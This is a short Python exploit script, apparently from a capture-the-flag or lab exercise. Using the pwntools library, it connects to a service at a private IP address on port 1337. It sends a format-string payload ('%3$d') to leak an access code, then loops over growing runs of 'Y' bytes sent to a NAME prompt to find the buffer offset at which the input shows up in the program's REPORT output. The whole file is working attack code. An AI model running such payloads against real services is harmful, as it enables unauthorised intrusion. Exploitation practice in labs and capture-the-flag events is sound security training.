#!/usr/bin/python3
from pwn import remote, log

shell = remote("192.168.100.64", 1337)

shell.recvuntil(b"CODE: ")
shell.sendline(b"%3$d")
shell.recvuntil(b"CODE: ")

code = shell.recvline().strip()
shell.sendline(code)

bar = log.progress("bytes")

for bytes in range(1, 1024):
    shell.recvuntil(b"COMMAND: ")
    shell.sendline(b"3")
    shell.recvuntil(b"NAME: ")

    junk = b"Y" * bytes
    shell.sendline(junk)

    shell.recvuntil(b"REPORT ")
    output = shell.recv(3).decode()
    bar.status(f"{str(bytes)} {output}")

    if output == "[Y]":
        bar.success(f"{str(bytes)} {output}")
        break
